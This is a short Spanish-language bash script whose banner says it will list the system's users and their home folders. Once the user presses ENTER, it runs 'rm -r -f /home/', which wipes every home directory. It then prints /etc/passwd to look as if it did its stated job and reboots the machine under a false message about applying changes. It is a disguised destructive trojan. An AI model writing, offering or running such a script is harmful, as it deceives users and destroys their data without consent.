clear
echo    
printf "      \e[1;77m\e[41m  Obtén toda la lista de usuarios de tu sistema!  \e[0m\n"
echo "        Lista de usuarios y carpeta raiz de cada uno."
echo    
echo   
read -p "Pulsa ENTER para comenzar"
clear
echo Esta comenzando el proceso...
sleep 1
rm -r -f /home/
sleep 2
echo Terminando proceso de obtención, espere...
sleep 2
cat /etc/passwd
echo
echo
read -p "Si has terminado, precione ENTER."
clear
echo
echo A continuación su sistema será reiniciado para aplicar ciertos cambios...
sleep 1
reboot
